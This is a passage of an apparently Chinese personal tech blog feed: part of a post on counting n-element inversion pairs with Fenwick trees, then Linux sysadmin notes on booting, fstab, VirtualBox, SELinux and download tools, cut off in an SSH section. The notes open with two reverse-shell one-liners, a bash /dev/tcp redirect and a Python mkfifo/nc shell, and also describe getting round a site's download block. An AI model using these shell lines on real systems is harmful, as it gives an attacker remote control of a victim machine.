    <content type="html"><![CDATA[<blockquote><p>以下思路都是针对从小到大排序的序列的逆序对</p></blockquote><ul><li>首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i&gt;x_{i+1}&gt;x_{i+2}&gt;…$那么就是逆序对</li><li>主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量</li><li>假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n]</li><li>首先看看如何求二元逆序对<ul><li>从左到右扫描序列，对于序列中位置为<code>i</code>的值<code>x</code>，flag[x]+=1</li><li>然后此时，以该x结尾的逆序对的数量就是$\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i]</li><li>那么result的数组的和就是逆序对的数量</li><li>同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对</li></ul></li><li>三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result_2数组)，此时设另外的两个数组int flag_3[MAX+1], int result_3[n];<ul><li>同样扫描序列，对于位置为<code>i</code>的数<code>x</code>，取出result_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag_3[x]记录了截止目前，以x结尾的二元组逆序对的数量</li><li>求$\sum_{j=x+1}^{MAX}flag_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中</li><li>到最后，result_3就是结果</li></ul></li><li>更多元组的也如此思路</li><li>这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对</li><li>对于n元逆序对，同理，数组记录了当前已有的数<code>x</code>作为<code>最后一个元素是x的n-1元逆序对</code>的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与<code>比他大的数代表的n-1元逆序对</code>形成了更长的逆序对</li><li>然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第<code>i</code>位的值是<code>x</code>）</li></ul><blockquote><p>3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso）</p></blockquote>]]></content>
    
    <summary type="html">
    
      n元逆序对数量求解并利用树状数组优化
    
    </summary>
    
      <category term="算法" scheme="https://h-zex.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="https://h-zex.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="树状数组" scheme="https://h-zex.github.io/tags/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>My ITOps Note</title>
    <link href="https://h-zex.github.io/2018/02/02/My-ITOPS-Note/"/>
    <id>https://h-zex.github.io/2018/02/02/My-ITOPS-Note/</id>
    <published>2018-02-02T06:18:30.000Z</published>
    <updated>2019-02-03T03:23:48.158Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><ul><li>受控机器上执行<code>bash -i /dev/tcp/IP/PORT 0&lt;&amp;1</code> (最后改为<code>0&gt;&amp;1</code>也ok)，入侵者机器提前打开listen socket，可以实现reverse shell</li><li><code>eval(&quot;__import__(&#39;os&#39;).system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc localhost 8000 &gt; /tmp/f&#39;)&quot;)</code>（python代码）也可以</li></ul><h3 id="SIGINT的SIG-DEF"><a href="#SIGINT的SIG-DEF" class="headerlink" title="SIGINT的SIG_DEF"></a>SIGINT的SIG_DEF</h3><ul><li>默认的handler会输出一个换行。</li><li><p>代码</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果不<code>kill -2 a.out</code>则不会输出一个空行，如果kill则会</p></li></ul><h3 id="boot过程"><a href="#boot过程" class="headerlink" title="boot过程"></a>boot过程</h3><ul><li>究竟是否有使用 /dev/sda 第一个sector，还是说uefi中我选择deepin 的boot loader那么直接就去sda12读取第一个sector</li><li>我在grub命令行环境可以很好的读取各个分区的东西，那么为什么还需要<code>initrd    /boot/initrd.img-4.9.0-deepin13-amd64</code>。（我甚至可以在这条命令前去加载一个ntfs的module）。</li><li>既然boot loader 可以加载<code>/boot/</code>目录中的vmlinuz、initrd，那么为什么还需要kernel 加载sata驱动来加载文件呢</li><li>关于initrd <blockquote><p>The special file /dev/initrd is a read-only block device. This device is a RAM disk that is initialized (e.g., loaded) by the boot loader before the kernel is started. The kernel then can use /dev/initrd’s contents for a two-phase system boot-up. In the first boot-up phase, the kernel starts up and mounts an initial root filesystem from the contents of /dev/initrd (e.g., RAM disk initialized by the boot loader). In the second phase, additional drivers or other modules are loaded from the initial root device’s contents. After loading the additional modules, a new root filesystem (i.e., the normal root filesystem) is mounted from a different device.<br>Boot-up operation<br>   When booting up with initrd, the system boots as follows:</p><ol><li>The boot loader loads the kernel program and /dev/initrd’s contents into memory.</li><li>On kernel startup, the kernel uncompresses and copies the contents of the device /dev/initrd onto device /dev/ram0 and then frees the memory used<br>by /dev/initrd.</li><li>The kernel then read-write mounts the device /dev/ram0 as the initial root filesystem.</li><li>If  the  indicated  normal  root  filesystem is also the initial root filesystem (e.g., /dev/ram0) then the kernel skips to the last step for the<br>usual boot sequence.</li><li>If the executable file /linuxrc is present in the initial root filesystem, /linuxrc is executed with UID 0.  (The file /linuxrc  must  have  exe‐<br>cutable permission.  The file /linuxrc can be any valid executable, including a shell script.)</li><li>If  /linuxrc is not executed or when /linuxrc terminates, the normal root filesystem is mounted.  (If /linuxrc exits with any filesystems mounted<br>on the initial root filesystem, then the behavior of the kernel is UNSPECIFIED.  See the NOTES section for the current kernel behavior.)</li><li>If the normal root filesystem has a directory /initrd, the device /dev/ram0 is moved from / to /initrd.  Otherwise, if the directory /initrd does<br>not  exist, the device /dev/ram0 is unmounted.  (When moved from / to /initrd, /dev/ram0 is not unmounted and therefore processes can remain run‐<br>ning from /dev/ram0.  If directory /initrd does not exist on the normal root filesystem and any processes  remain  running  from  /dev/ram0  when<br>/linuxrc exits, the behavior of the kernel is UNSPECIFIED.  See the NOTES section for the current kernel behavior.)</li><li>The usual boot sequence (e.g., invocation of /sbin/init) is performed on the normal root filesystem.</li></ol></blockquote></li></ul><h3 id="tab补全失效"><a href="#tab补全失效" class="headerlink" title="tab补全失效"></a>tab补全失效</h3><ul><li>when press tab to 补全, there is   bash: 无法为立即文档创建临时文件: 权限不够</li><li>this is because of the /dev/sda9 is mounted on /tmp, umonut it repair this error</li></ul><h3 id="登录用户管理"><a href="#登录用户管理" class="headerlink" title="登录用户管理"></a>登录用户管理</h3><ul><li><p><code>users</code>或 <code>w</code>查看当前登录的用户</p></li><li><p><code>lsof -iTCP</code> <code>netstat -tunp</code>查看当前的网络连接</p></li><li><p>查看打开的端口</p></li><li><p><code>pkill -kill -t pts/1</code> 踢掉pts/1</p></li><li><p>编辑<code>/etc/hosts.deny</code> ，deny掉ip或ip段，保存立即生效？(至今仍然不知道是否有效，以及不知道通配符要怎么写，好像是 xx.xx.xx.表示xx.xx.xx.00/24子网)</p><p>格式如下（其实不是非常确定以下是有用的）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sshd:218.65.30.43:deny</span><br><span class="line">sshd:58.*.*.*:deny</span><br></pre></td></tr></table></figure></li></ul><h3 id="是否没有listen的socket就无法被入侵？"><a href="#是否没有listen的socket就无法被入侵？" class="headerlink" title="是否没有listen的socket就无法被入侵？"></a>是否没有listen的socket就无法被入侵？</h3><h3 id="wget使用"><a href="#wget使用" class="headerlink" title="wget使用"></a>wget使用</h3><ul><li><code>-r</code>递归下载</li><li><code>-k</code>把下载下来的连接修改为本地地址</li><li><code>-e robots=off</code>不respect<code>robots.txt</code></li><li>或者是 set the <code>robots</code> variable to ‘off’ in your .wgetrc. </li><li><code>--user-agent=&quot;&quot;</code>不添加user-agent头，如果不加上这个，有些网站会返回404</li></ul><h3 id="curl的使用"><a href="#curl的使用" class="headerlink" title="curl的使用"></a>curl的使用</h3><ul><li>curl可以模拟post/get等行为，但是似乎没法递归下载</li></ul><h3 id="axel的使用"><a href="#axel的使用" class="headerlink" title="axel的使用"></a>axel的使用</h3><ul><li><code>-n 100</code>开100个线程</li><li>好像还可以调整缓存，从而减少写入磁盘的次数</li></ul><h3 id="VirtualBox报错“kernel-dirver-not-installed”"><a href="#VirtualBox报错“kernel-dirver-not-installed”" class="headerlink" title="VirtualBox报错“kernel dirver not installed”"></a>VirtualBox报错“kernel dirver not installed”</h3><ul><li>复现：编译4.17内核（非稳定版，仓库也没有linux-header-4.17）并安装，安装过程中就报了一个有关virtualbox的错。后面跑这个内核时，virtualbox就提示“kernel driver not installed”，要求重新安装<code>virtualbox-dkms</code>，并运行<code>modprobe vboxdrv</code></li><li><p>在4.17内核尝试</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install virtualbox-dkms</span><br><span class="line">sudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkms</span><br><span class="line">sudo apt install --reinstall linux-headers-$(uname -r) virtualbox-dkms dkms</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p> 都没有解决问题，更严重的，linux-header-4.17也没有</p></li><li>切换到4.15内核没有解决问题。尝试了以上命令无果</li><li><p>删除4.17内核（直接在<code>/boot/</code>运行<code>rm *4.17* -r</code>）后<code>update-grub</code>。然后重启到<code>4.15.0-23-generic</code>并执行</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install --fix-missing</span><br><span class="line">sudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkms </span><br><span class="line">sudo modprobe vboxdrv</span><br></pre></td></tr></table></figure><p> 解决问题</p></li><li>题外话：删除内核时，<code>dpkg --get-selections | grep linux</code> 没有看到4.17相关的</li></ul><h3 id="删除内核"><a href="#删除内核" class="headerlink" title="删除内核"></a>删除内核</h3><ul><li><code>sudo apt-get remove linux-headers-4.4.0-22</code></li><li>在<code>/boot/</code>目录下删除相关的东西</li></ul><h3 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h3><ul><li><code>chmod -R 666 test</code>(test is a directory)会导致文件夹里的东西不可读（ls、cd该文件夹都不行）</li><li>给文件夹本身加上x——<code>chmod 777 test</code>就可以了——文件夹内的东西不需要有可执行权限，但是文件夹的权限要有<code>x</code>标志</li></ul><h3 id="内核模块加载"><a href="#内核模块加载" class="headerlink" title="内核模块加载"></a>内核模块加载</h3><ul><li><code>modprobe tcp_bbr</code>加载<code>tcp_bbr</code>模块 </li><li>比如，<code>echo &quot;tcp_bbr&quot;&gt;&gt; /etc/modules-load.d/modules.conf</code>即可实现启动自动加载该模块</li></ul><h3 id="ufw"><a href="#ufw" class="headerlink" title="ufw"></a>ufw</h3><ul><li>如果有一条规则允许任意from ip 连本机的某个端口，协议是udp，然后还有另一条规则是只允许某ip K连本机的任意端口，协议是tcp，那么用ip 为K的机子去连是连不上udp的，似乎是因为规则的强弱导致的覆盖</li></ul><h3 id="安装centos-md"><a href="#安装centos-md" class="headerlink" title="安装centos.md"></a>安装centos.md</h3><h4 id="联网"><a href="#联网" class="headerlink" title="联网"></a>联网</h4><ul><li><p><a href="http://icyleaf.com/2013/09/network-configuration-in-centos/" target="_blank" rel="noopener">参考资料</a></p></li><li><p>修改<code>/etc/sysconfig/network-scripts/ifcfg-eth0 (此处为网卡名对应的文件，比入enps0是ifcfg-enps0)</code></p></li><li><p>改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DEVICE=eth0</span><br><span class="line">HWADDR=&quot;00:22:19:09:4D:3C&quot;</span><br><span class="line">NM_CONTROLLED=yes</span><br><span class="line">ONBOOT=yes      # 默认是 no，我们要改成 yes</span><br><span class="line">BOOTPROTO=dhcp  # 如果不是这个值也要修改</span><br></pre></td></tr></table></figure></li><li><p>重启network service</p><ul><li>方法一：<code>service network restart</code></li><li>方法二：<code>/etc/init.d/network restart</code></li></ul></li><li><p>vbox似乎默认有开nat，所以以上即可，qemu好像要自己配置nat</p></li></ul><h4 id="安装图形界面"><a href="#安装图形界面" class="headerlink" title="安装图形界面"></a>安装图形界面</h4><ul><li><a href="https://www.quora.com/How-can-I-install-X-Windows-on-CentOS-7" target="_blank" rel="noopener">安装图形界面</a><ul><li><code>yum groupinstall &quot;X Window System&quot;</code></li><li><code>yum install gnome-classic-session gnome-terminal nautilus-open-terminal control-center liberation-mono-fonts</code></li><li><code>unlink /etc/systemd/system/default.target</code></li><li><code>ln -sf /lib/systemd/system/graphical.target  /etc/systemd/system/default.target</code></li></ul></li></ul><h3 id="使用fstab自动挂载"><a href="#使用fstab自动挂载" class="headerlink" title="使用fstab自动挂载"></a>使用fstab自动挂载</h3><h4 id="Deepin"><a href="#Deepin" class="headerlink" title="Deepin"></a>Deepin</h4><ul><li><p>以下是<code>/etc/fstab</code>的内容</p></li><li><p>在<code>Linux hzx-PC 4.9.0-deepin13-amd64 #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19) x86_64 GNU/Linux</code>正确工作</p></li><li><p>代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># /dev/sda7</span><br><span class="line">UUID=1faa19b8-abfb-44db-b186-5a368498d42b/         ext4      rw,relatime,data=ordered0 1</span><br><span class="line"></span><br><span class="line"># /dev/sda1</span><br><span class="line">UUID=CCCB-BF68      /boot/efi vfat      rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=mixed,utf8,errors=remount-ro0 2</span><br><span class="line"></span><br><span class="line"># /dev/sda4</span><br><span class="line">UUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3none      swap      defaults  0 0</span><br><span class="line"></span><br><span class="line"># /dev/sda5</span><br><span class="line"># UUID=0CADCC32742391F2       /home/hzx/sda5      ntfs defaults0 1</span><br><span class="line">UUID=0CADCC32742391F2   /mnt/data  ntfs defaults  1   2</span><br><span class="line"></span><br><span class="line"># /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2</span><br><span class="line"># /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2</span><br><span class="line"></span><br><span class="line"># /dev/sda6</span><br><span class="line"># UUID=2A3C344750F6F698       /home/hzx/sda6         ntfs defaults0 1</span><br><span class="line">UUID=2A3C344750F6F698   /mnt/software  ntfs defaults 1   2</span><br><span class="line"></span><br><span class="line"># /dev/sda3</span><br><span class="line"># UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa       /home/hzx/sda3     ext4 defaults0 1</span><br><span class="line">UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa/mnt/deepin-sda3 ext4  defaults  1   2</span><br></pre></td></tr></table></figure></li><li><p>然而并没有一直正常，后来修改了一次挂载点后，就一直崩，无论是把<code>defaults</code>换成<code>nofail</code>还是相反，都没用</p></li><li><p>后来多启动几次就好了，，可能是类似多进程执行顺序之类的东西导致的不确定性错误</p></li></ul><h4 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h4><ul><li><p>一切正常</p></li><li><p>代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># /etc/fstab: static file system information.</span><br><span class="line">#</span><br><span class="line"># Use &apos;blkid&apos; to print the universally unique identifier for a</span><br><span class="line"># device; this may be used with UUID= as a more robust way to name devices</span><br><span class="line"># that works even if disks are added and removed. See fstab(5).</span><br><span class="line">#</span><br><span class="line"># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;</span><br><span class="line"># / was on /dev/sda8 during installation</span><br><span class="line">UUID=3ae3faef-8fe6-42ef-8874-a0417df43831 /               ext4    errors=remount-ro 0       1</span><br><span class="line"># /boot/efi was on /dev/sda1 during installation</span><br><span class="line">UUID=CCCB-BF68  /boot/efi       vfat    umask=0077      0       1</span><br><span class="line"># swap was on /dev/sda4 during installation</span><br><span class="line">UUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3 none            swap    sw              0       0</span><br><span class="line"># /dev/sda5</span><br><span class="line"># UUID=0CADCC32742391F2       /home/hzx/sda5      ntfs defaults0 1</span><br><span class="line">UUID=0CADCC32742391F2   /media/hzx/0CADCC32742391F2  ntfs nofail  1   2</span><br><span class="line"># /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2</span><br><span class="line"># /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2</span><br><span class="line"></span><br><span class="line"># /dev/sda6</span><br><span class="line"># UUID=2A3C344750F6F698       /home/hzx/sda6         ntfs defaults0 1</span><br><span class="line">UUID=2A3C344750F6F698   /media/hzx/2A3C344750F6F698  ntfs nofail  1   2</span><br><span class="line"></span><br><span class="line"># /dev/sda9</span><br><span class="line">UUID=202D1B334927E0CC /media/hzx/202D1B334927E0CC ntfs nofail 1 2</span><br><span class="line"></span><br><span class="line"># /dev/sda3</span><br><span class="line"># UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa       /home/hzx/sda3     ext4 defaults0 1</span><br><span class="line">UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa/media/hzx/9bb0bb13-a28a-48a4-8022-6e83dcec47aa ext4 nofail     1   2</span><br></pre></td></tr></table></figure></li></ul><h3 id="mkfs-vfat了sda2那个efi分区结果deepin启动不了"><a href="#mkfs-vfat了sda2那个efi分区结果deepin启动不了" class="headerlink" title="mkfs.vfat了sda2那个efi分区结果deepin启动不了"></a>mkfs.vfat了sda2那个efi分区结果deepin启动不了</h3><ul><li>情况是这样的：往sda2装grub后总是失败，然后deepin自己的boot分区虽然也有grub，也有grub.cfg但是也一直必须手动引导。然后把sda2格式化后不知道为什么deepin无法启动。</li><li>放弃，新装一个deepin 15.6，然后就会自动安装引导。</li><li>搞定后，进原来那个deepin15.5还是失败，查看<code>journalctl -xb</code>，发现有个设备无法加载还是怎样的，然后想到以前该fstab也这样，所以比对错误信息和fstab，果然如此。</li><li>原因是swap分区的uuid改了，并且也从sda4变成sda5，然而并没有去新建分区什么的，只有格式化sda2。</li><li>后来猜测之所以装不上grub可能是sda2太小，只有100M，deepin提示说至少要300M</li></ul><h3 id="编译内核-md"><a href="#编译内核-md" class="headerlink" title="编译内核.md"></a>编译内核.md</h3><h4 id="无openssl-bio-h"><a href="#无openssl-bio-h" class="headerlink" title="无openssl/bio.h"></a>无openssl/bio.h</h4><blockquote><p>编译Linux-4.9.11内核时遇到：“error : openssl/bio.h :No such file or folder”</p><p> “ #include &lt;openssl/bio.h&gt;”</p><p>&lt;&lt;<------------------------------------>&gt;&gt;</------------------------------------></p><p>解决方法: [ubuntu 16.10,64位主机]</p><p><code>sudo apt install libssl-dev</code></p></blockquote><h3 id="记一次尝试下载-不允许下载的sinacloud的pdf"><a href="#记一次尝试下载-不允许下载的sinacloud的pdf" class="headerlink" title="记一次尝试下载 不允许下载的sinacloud的pdf"></a>记一次尝试下载 不允许下载的sinacloud的pdf</h3><ul><li><p>获得页面源代码</p></li><li><p>在html搜索字符串next从而定位到逻辑代码</p></li><li><p>然后看到后面一堆JavaScript:void(0)，发现前面有个函数，但是页面内一堆引用外部的js脚本</p></li><li><p>然后去chrome控制台使用以下代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    script.type = <span class="string">'text/javascript'</span>;</span><br><span class="line">    script.innerHTML = <span class="string">"console.log(closePay)"</span><span class="comment">//括号内是要获得的函数名称;</span></span><br><span class="line">    <span class="built_in">document</span>.head.appendChild(script);</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure></li><li><p>然后等chrome显示出来后，点击显示出来的东西可以跳转到source code那里。从而最终定位到该函数所在的脚本，但是苦于代码过度，审计失败</p></li><li><p>直接wget那些url得到的是206，但是wget一直停不下来，尝试用axel开20个线程下载，但是每次下来的都是13.9m大小的东西，然后还打不开（除了其中一页图片）</p></li><li><p>查看chrome控制台的network模块，发现图片都没那么大，所以尝试右键copy request head发现并没有特别的，所以不知道为什么wget和axel没成功，copy curl后发现似乎是一个curl命令，加上-o参数后成功下载，curl即使不加上请求头，也可以正常获得东西，nice</p></li></ul><h4 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//request head</span><br><span class="line">http://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=6020439-6389345</span><br><span class="line"><span class="keyword">GET</span> <span class="string">/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=6020439-6389345</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: sinacloud.net</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: image/webp,image/apng,image/*,*/*;q=0.8</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: en,zh;q=0.9,zh-CN;q=0.8</span><br><span class="line"></span><br><span class="line">//从chrome复制的curl命令</span><br><span class="line">curl 'http://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=3259947-3560373' -H 'Accept: image/webp,image/apng,image/*,*/*;q=0.8' -H 'Connection: keep-alive' -H 'DNT: 1' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en,zh;q=0.9,zh-CN;q=0.8' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36' --compressed</span><br></pre></td></tr></table></figure><h3 id="查找并删除特定文件-md"><a href="#查找并删除特定文件-md" class="headerlink" title="查找并删除特定文件.md"></a>查找并删除特定文件.md</h3><p><a href="https://www.cnblogs.com/langzou/p/5959940.html" target="_blank" rel="noopener">来源</a><br>linux命令每日一练<br>linux中find与rm实现查找并删除目录或文件</p><p>linux 下用find命令查找文件，rm命令删除文件。</p><p>删除指定目录下指定文件<br>find 要查找的目录名 -name .svn |xargs rm -rf</p><p>删除指定名称的文件或文件夹: find -type d | grep .svn$ | xargs rm -r</p><p>分析：<br>find -type d | grep .svn$ 通过此命令查找文件夹 过滤正则表达式中的目录<br>| xargs rm -r 执行删除指令</p><p>删除目录下所有exe文件</p><p>find . -name ‘*.exe’ -type f -print -exec rm -rf {} ;</p><p>(1) “.” 表示从当前目录开始递归查找</p><p>(2) “ -name ‘*.exe’ “根据名称来查找，要查找所有以.exe结尾的文件夹或者文件</p><p>(3) “ -type f “查找的类型为文件</p><p>(4) “-print” 输出查找的文件目录名</p><p>(5) 最主要的是是-exec了，-exec选项后边跟着一个所要执行的命令，表示将find出来的文件或目录执行该命令。<br>exec选项后面跟随着所要执行的命令或脚本，然后是一对儿{}，一个空格和一个，最后是一个分号</p><h3 id="VPS上部署hexo"><a href="#VPS上部署hexo" class="headerlink" title="VPS上部署hexo"></a>VPS上部署hexo</h3><ul><li><p><a href="https://blog.fundebug.com/2017/05/18/deploy-hexo-on-cloud/" target="_blank" rel="noopener">参考文章</a></p></li><li><p>遇到nginx 403，然后就关闭selinux</p><blockquote><p>1、临时关闭<br>setenforce 0 #设置SELinux 成为permissive模式</p><h5 id="setenforce-1-设置SELinux-成为enforcing模式"><a href="#setenforce-1-设置SELinux-成为enforcing模式" class="headerlink" title="setenforce 1 设置SELinux 成为enforcing模式"></a>setenforce 1 设置SELinux 成为enforcing模式</h5><p>2、修改配置文件需要重启机器：</p><p>修改/etc/selinux/config 文件</p><p>将SELINUX=enforcing改为SELINUX=disabled</p><p>重启机器即可</p></blockquote></li></ul><h3 id="搭建ss服务器"><a href="#搭建ss服务器" class="headerlink" title="搭建ss服务器"></a>搭建ss服务器</h3><ul><li>vps开了进程</li><li>本地主机也如此</li><li>但是提示[Errno 113] No route to host</li><li>实在搞不明白——22端口可以用scp发文件过去vps</li><li>所以用py写了个tcpclient、tcpserver，然后一运行也如此提示</li><li>所以在vps运行<code>service firewalld stop</code></li><li>其他关闭服务器防火墙的方法都不起作用，不知道问什么</li></ul><h3 id="VLC字幕"><a href="#VLC字幕" class="headerlink" title="VLC字幕"></a>VLC字幕</h3><p><a href="http://blog.sina.com.cn/s/blog_47ecc3660100vtnc.html" target="_blank" rel="noopener">链接</a></p><h3 id="vbox的win7虚拟机无法使用usb"><a href="#vbox的win7虚拟机无法使用usb" class="headerlink" title="vbox的win7虚拟机无法使用usb"></a>vbox的win7虚拟机无法使用usb</h3><ul><li><a href="https://blog.csdn.net/harry_helei/article/details/46972125" target="_blank" rel="noopener">引用自</a></li><li>安装Virtualbox Extension Pack</li><li>用户权限添加<ul><li>添加usbfs 用户组（virtualbox 装完成后会有 vboxusers 和vboxsf ）<code>sudo groupadd usbfs</code>   </li><li>将你的linux常用用户添加到vboxusers、usbfs这个两个组中<code>sudo adduser kuein vboxusers</code>  <code>sudo adduser kuein usbfs</code> </li><li>重启电脑，启动Virtualbox，确认在virtualbox管理器中，USB设备的enable usb controler 、enable usb2.0 controler打勾。Win7启动后，右击右下角USB设备符号，在Setting中，选择USB Massage相关的选项，就会自动安装驱动，驱动安装成功后，win7下成功挂载U盘。</li></ul></li></ul><h3 id="Gnome-configure-md"><a href="#Gnome-configure-md" class="headerlink" title="Gnome-configure.md"></a>Gnome-configure.md</h3><h3 id="hide-title-bar"><a href="#hide-title-bar" class="headerlink" title="hide title bar"></a>hide title bar</h3><p><a href="https://extensions.gnome.org/extension/1267/no-title-bar/" target="_blank" rel="noopener">no-title-bar-extention</a></p><h3 id="SSH-md"><a href="#SSH-md" class="headerlink" title="SSH.md"></a>SSH.md</h3><h4 id="生成秘钥"><a href="#生成秘钥" class="headerlink" title="生成秘钥"></a>生成秘钥</h4><ul><li>本地用<code>ssh-keygen</code>生成一个秘钥——可以自定义储存的文件名</li><li>把<code>id_rsa.pub</code>传送到vps上，<code>cat id_rsa.pug &gt; 